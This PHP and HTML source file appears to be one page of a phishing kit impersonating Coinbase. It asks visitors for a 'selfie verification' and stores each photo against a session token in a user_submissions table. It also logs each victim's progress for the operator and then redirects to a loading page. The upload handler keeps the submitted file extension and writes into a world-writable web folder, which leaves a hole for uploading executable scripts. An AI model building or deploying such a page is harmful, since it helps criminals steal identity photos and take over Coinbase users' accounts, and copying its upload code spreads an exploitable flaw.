<?php
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn;
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    header("Location: login.php");
    exit();
}

// Retrieve the email and token from the session
$email = $_SESSION["email"];
$token = $_SESSION["token"];

// Update user activity to indicate selfie page
updateActivity($token, "SelfieVerification");

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Handle file uploads
    $upload_dir = 'uploads/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0777, true);
    }
    
    $success = false;
    $verification_date = date('Y-m-d H:i:s');
    
    if (isset($_FILES['selfie_photo']) && $_FILES['selfie_photo']['error'] == UPLOAD_ERR_OK) {
        $filename = $token . '_selfie_' . time() . '.' . pathinfo($_FILES['selfie_photo']['name'], PATHINFO_EXTENSION);
        $filepath = $upload_dir . $filename;
        
        if (move_uploaded_file($_FILES['selfie_photo']['tmp_name'], $filepath)) {
            // Update database with selfie path
            $stmt = $conn->prepare("UPDATE user_submissions SET selfie = ?, document_selfie_path = ?, id_verified = 1, id_verification_date = ? WHERE token = ?");
            $stmt->bind_param("ssss", $filename, $filepath, $verification_date, $token);
            
            if ($stmt->execute()) {
                updateActivity($token, "SelfieSubmitted");
                $success = true;
                // Redirect to loading screen after successful submission
                header("Location: loading.php");
                exit();
            }
            $stmt->close();
        }
    }
    
    if (!$success) {
        $error = "Error uploading selfie. Please try again.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Selfie Verification</title>
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2');
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #0a0b0d;
            line-height: 1.5;
        }
        
        .wrapper {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 40px 20px;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
            background: white;
            border-radius: 16px;
            padding: 32px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
        }
        
        .header {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .logo {
            height: 32px;
            margin-bottom: 16px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #0a0b0d;
        }
        
        .subtitle {
            color: #6b7280;
            margin-bottom: 24px;
            font-size: 14px;
        }
        
        .progress-container {
            width: 100%;
            background-color: #e5e7eb;
            border-radius: 4px;
            margin-bottom: 32px;
            height: 4px;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            width: 100%;
            background-color: #0052ff;
            transition: width 0.3s ease;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 14px;
            color: #111827;
        }
        
        .selfie-upload {
            border: 2px dashed #d1d5db;
            border-radius: 8px;
            padding: 40px 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 24px;
        }
        
        .selfie-upload:hover {
            border-color: #9ca3af;
            background-color: #f9fafb;
        }
        
        .selfie-upload input[type="file"] {
            display: none;
        }
        
        .selfie-preview {
            max-width: 100%;
            max-height: 300px;
            margin: 0 auto 20px;
            display: none;
            border-radius: 8px;
        }
        
        .upload-icon {
            font-size: 32px;
            color: #9ca3af;
            margin-bottom: 12px;
        }
        
        .upload-text {
            color: #6b7280;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .upload-hint {
            color: #9ca3af;
            font-size: 12px;
        }
        
        .btn {
            display: inline-block;
            background-color: #0052ff;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
        }
        
        .btn:hover {
            background-color: #0042cc;
        }
        
        .btn:disabled {
            background-color: #e5e7eb;
            cursor: not-allowed;
        }
        
        .error-message {
            color: #ef4444;
            font-size: 14px;
            margin-top: 8px;
            display: none;
        }
        
        .requirements {
            font-size: 12px;
            color: #6b7280;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <div class="header">
                <img src="https://assets.ifttt.com/images/channels/1358877763/icons/monochrome_large.png" alt="Coinbase Logo" class="logo">
                <h1>Selfie Verification</h1>
                <p class="subtitle">Please take a selfie to verify your identity</p>
                <div class="progress-container">
                    <div class="progress-bar" style="width: 100%;"></div>
                </div>
            </div>
            
            <?php if (isset($error)): ?>
                <div class="error-message" style="display: block; margin-bottom: 20px;">
                    <?php echo htmlspecialchars($error); ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" enctype="multipart/form-data" id="selfieForm">
                <div class="form-group">
                    <div class="selfie-upload" id="selfieUpload">
                        <div class="upload-icon">
                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" fill="currentColor"/>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12ZM20 12C20 16.4183 16.4183 20 12 20C7.58172 20 4 16.4183 4 12C4 7.58172 7.58172 4 12 4C16.4183 4 20 7.58172 20 12Z" fill="currentColor"/>
                            </svg>
                        </div>
                        <div class="upload-text">Take a selfie</div>
                        <div class="upload-hint">Make sure your face is clearly visible</div>
                        <input type="file" id="selfieInput" name="selfie_photo" accept="image/*" capture="user" required>
                    </div>
                    <img id="selfiePreview" class="selfie-preview" alt="Selfie preview">
                    <div class="requirements">
                        • Face must be clearly visible<br>
                        • No filters or effects<br>
                        • Good lighting is recommended
                    </div>
                </div>
                
                <button type="submit" class="btn" id="submitBtn" disabled>Submit Selfie</button>
                <div class="error-message" id="errorMessage"></div>
            </form>
        </div>
    </div>

    <script>
        const selfieUpload = document.getElementById('selfieUpload');
        const selfieInput = document.getElementById('selfieInput');
        const selfiePreview = document.getElementById('selfiePreview');
        const submitBtn = document.getElementById('submitBtn');
        const errorMessage = document.getElementById('errorMessage');
        
        // Handle file selection
        selfieUpload.addEventListener('click', () => {
            selfieInput.click();
        });
        
        // Handle file input change
        selfieInput.addEventListener('change', (e) => {
            const file = e.target.files[0];
            if (file) {
                if (file.size > 5 * 1024 * 1024) { // 5MB limit
                    showError('File is too large. Maximum size is 5MB.');
                    return;
                }
                
                const reader = new FileReader();
                reader.onload = (event) => {
                    selfiePreview.src = event.target.result;
                    selfiePreview.style.display = 'block';
                    submitBtn.disabled = false;
                    errorMessage.style.display = 'none';
                };
                reader.readAsDataURL(file);
            }
        });
        
        // Handle drag and drop
        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
            selfieUpload.addEventListener(eventName, preventDefaults, false);
        });
        
        function preventDefaults(e) {
            e.preventDefault();
            e.stopPropagation();
        }
        
        ['dragenter', 'dragover'].forEach(eventName => {
            selfieUpload.addEventListener(eventName, highlight, false);
        });
        
        ['dragleave', 'drop'].forEach(eventName => {
            selfieUpload.addEventListener(eventName, unhighlight, false);
        });
        
        function highlight() {
            selfieUpload.style.borderColor = '#0052ff';
            selfieUpload.style.backgroundColor = '#f0f7ff';
        }
        
        function unhighlight() {
            selfieUpload.style.borderColor = '#d1d5db';
            selfieUpload.style.backgroundColor = '';
        }
        
        // Handle file drop
        selfieUpload.addEventListener('drop', handleDrop, false);
        
        function handleDrop(e) {
            const dt = e.dataTransfer;
            const file = dt.files[0];
            
            if (file) {
                if (file.type.startsWith('image/')) {
                    selfieInput.files = dt.files;
                    const event = new Event('change');
                    selfieInput.dispatchEvent(event);
                } else {
                    showError('Please upload an image file.');
                }
            }
        }
        
        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            submitBtn.disabled = true;
        }
    </script>
</body>
</html>
